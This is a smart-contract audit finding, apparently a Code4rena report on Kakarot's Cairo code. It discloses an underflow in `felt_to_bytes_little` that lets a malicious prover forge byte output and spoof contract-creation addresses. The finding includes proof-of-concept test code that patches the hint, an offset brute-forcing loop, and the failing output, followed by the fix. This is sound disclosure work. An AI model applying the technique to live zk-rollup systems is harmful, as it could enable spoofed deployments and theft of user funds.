---
tags:
  - blockchain/starknet
  - lang/cairo
  - lang/solidity
  - sector/account
  - sector/zk
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - vuln/arithmetic/underflow
  - impact/loss-of-funds/direct-drain
  - novelty/known-pattern
  - misassumption/math-is-safe
  - fix/fix-arithmetic
protocol: "[[Kakarot]]"
auditors:
  - "[[superpozycja]]"
report: "https://code4rena.com/reports/2024-09-kakarot"
genome:
  - "[[underflow]]"
  - "[[direct-drain]]"
  - "[[known-pattern]]"
  - "[[integer-bounds]]"
  - "[[circuit-input-range-check]]"
---
# [H-02] Prover can cheat in `felt_to_bytes_little` due to value underflow

- id: 45169
- impact: HIGH
- protocol: [[Kakarot]]
- reporter: superpozycja (Code4rena)
- source: https://code4rena.com/reports/2024-09-kakarot

## Summary


The function `felt_to_bytes_little()` in `bytes.cairo` has a bug that allows a malicious user to cheat and return a string that does not match the input. This can be exploited to deploy L2 smart contracts from a fake sender address and potentially steal funds. The bug is also present in other functions that use `felt_to_bytes_little()`, making it a widespread issue. The bug is caused by a loop that can underflow and continue running, allowing the user to return arbitrary values. A proof of concept was created to demonstrate the exploit and a mitigation fix has been implemented. The severity of this bug is high and it is recommended to do range checks on `value` to prevent underflows.

## Details


The function `felt_to_bytes_little()` in `bytes.cairo` converts a felt into an array of bytes.

The prover can cheat by returning a near arbitrary string that does not correspond to the input felt, whereby, the spoofed output bytes and `bytes_len, bytes must fulfill some specific conditions (but, if carefully crafted, can contain almost arbitrary sequences of bytes).

This issue affects the function `felt_to_bytes_little()` as well as other functions that depend on it:

```
    - felt_to_bytes()
    - uint256_to_bytes_little()
    - uint256_to_bytes()
    - uint256_to_bytes32()
    - bigint_to_bytes_array()
```

Those functions are used throughout the code, notably in `get_create_address()` and `get_create2_address()`, which an attacker could exploit to deploy L2 smart contracts from a spoofed sender address (e.g., to steal funds from wallets that use account abstraction).

#### Details

First, note the following loop:

```
        body:
        let range_check_ptr = [ap - 3];
        let value = [ap - 2];
        let bytes_len = [ap - 1];
        let bytes = cast([fp - 4], felt*);
        let output = bytes + bytes_len;
        let base = 2 ** 8;
        let bound = base;

        %{
            memory[ids.output] = res = (int(ids.value) % PRIME) % ids.base
            assert res < ids.bound, f'split_int(): Limb {res} is out of range.'
        %}
        let byte = [output];
        with_attr error_message("felt_to_bytes_little: byte value is too big") {
            assert_nn_le(byte, bound - 1);
        }
        tempvar value = (value - byte) / base;

        tempvar range_check_ptr = range_check_ptr;
        tempvar value = value;
        tempvar bytes_len = bytes_len + 1;

        jmp body if value != 0;
```

We observe that:

1. Value can underflow if the byte returned in the last iteration is greater than the value remaining in the felt. For example, if the remaining value is 1 but the prover/hint returns 2, value will underflow into `STARKNET_PRIME - 1`. Consequently, the loop will continue running as `value != 0`.
2. In the following iterations of the loop, the prover can return arbitrary values, they just need to ensure that value eventually becomes 0. They can use as many iterations as required, but it is important that `bytes_len` ends up at a specific value (see 3).
3. Finally, at the end of the function, there is a check that `bytes_len` is the minimal one possible to represent the value. The lower bound and upper bound for this check is read from `pow256_table` at the offset `bytes_len`. The malicious prover must ensure that the value at this memory address (somewhere into the code segment) is lower than `initial_value`. Any nearby position where the Cairo bytecode contains a zero works.

### Proof of Concept

To pass the bounds check, we need a code offset that contains the value `0`. Fortunately, from a malicious prover's perspective, there are many zero-value locations in the code segment. When we dump the memory segment with a hint we find multiple zeroes:

```
    # Offset:content

    46: 5210805298050138111
    47: 5192296858534827628530496329220096
    48: 6
    49: 5189976364521848832
    50: 5193354047062507520
    51: 5189976364521848832
    52: 5193354004112834560
    53: 5191102242953854976
    54: 5198983563776458752
    55: 290341444919459839
    56: 5210805478438109184
    57: 5191102225773985792
    58: 2
    59: 0
    60: 2
    61: 0
    62: 51
    63: 1
    64: 0
    65: 0
    66: 0
    67: 116
    68: 2
    69: 0
    70: 0
    71: 0
    72: 186
    73: 0
    74: 0
    75: 0
    76: 4
```

When creating the proof of concept I had some problems calculating the offsets reliably, but I got it to work with a few brute-force tries. The following test worked reliably for me:

```
class TestFeltToBytesLittle:

    def test_felt_to_bytes_exploit(self, cairo_program, cairo_run):

        hint = f"if ids.bytes_len < 135:\n  memory[ids.output] = 2\n"\
            f"elif ids.bytes_len == 135:\n  ids.base == 2 ** 8\n  memory[ids.output] = res = (int(ids.value) % PRIME) % ids.base\n"\
            "else:  memory[ids.output] = res = (int(ids.value) % PRIME) % ids.base\n  "
            
        with (
            patch_hint(
                cairo_program,
                "memory[ids.output] = res = (int(ids.value) % PRIME) % ids.base\nassert res < ids.bound, f'split_int(): Limb {res} is out of range.'",
                hint,
            ),
        ):
                
            output = cairo_run("test__felt_to_bytes_little", n=1)
            expected = int.to_bytes(1, 1, byteorder="little")

            assert(bytes(output) == expected)
```

Running the test shows the prover's manipulated output vs. the expected output:

```
    FAILED tests/src/berndt/test_berndt.py::TestFeltToBytesLittle::test_felt_to_bytes_exploit - AssertionError: assert b'\x02\x02\x0...8\xb8\xb8\x04' == b'\x01'
      
      At index 0 diff: b'\x02' != b'\x01'
      
      Full diff:
      - b'\x01'
      + (b'\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02'
      +  b'\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02'
      +  b'\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02'
      +  b'\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02'
      +  b'\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02'
      +  b'\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02'
      +  b'\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02'
      +  b'\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02'
      +  b'\x02\x02\x02\x02\x02\x02\x02\xe6\x0f@@@@@\xd4~4\x84\xc4RQ\xa1\xf6\xcb'
      +  b'\xac\xad\x99\x95\x15\x96\xd6\xc6S\xba\xb8\xb8\xb8\xb8\x04')
```

A skilled attacker who invests enough time can almost arbitrary output strings, as long as they make sure that `value` reaches zero at some point and `pow256_table + bytes_len] == 0`.

P.S., whether the same offset works may depend on the Cairo compiler version. I used the following test to find a valid offset:

```
        def test_should_return_bytes(self, cairo_program, cairo_run):

            stop = 134

            while 1:

                print("Trying stop = " + str(stop))

                hint = f"if ids.bytes_len < {stop}:\n  memory[ids.output] = 2\n"\
                    f"elif ids.bytes_len == {stop}:\n  ids.base == 2 ** 8\n  memory[ids.output] = res = (int(ids.value) % PRIME) % ids.base\n"\
                    "else:  memory[ids.output] = res = (int(ids.value) % PRIME) % ids.base\n  "
        
                with (
                    patch_hint(
                        cairo_program,
                        "memory[ids.output] = res = (int(ids.value) % PRIME) % ids.base\nassert res < ids.bound, f'split_int(): Limb {res} is out of range.'",
                        hint,
                    ),
                ):
                    with cairo_error(message="bytes_len is not the minimal possible"):
                        output = cairo_run("test__felt_to_bytes_little", n=1)
                        expected = int.to_bytes(1, 1, byteorder="little")

                    stop += 1
```

### Recommended Mitigation Steps

The easiest fix is to do range checks on `value` to prevent underflows.

### Assessed type

Math

**[ClementWalter (Kakarot) confirmed and commented](https://github.com/code-423n4/2024-09-kakarot-findings/issues/118#issuecomment-2451969514):**
 > Severity: High<br>

**Kakarot mitigated:**
> [This PR](https://github.com/kkrt-labs/kakarot/pull/1573) fixes `felt_to_bytes_little` loop stop condition. The loop will stop at 31 bytes.

**Status:** Mitigation confirmed.

***
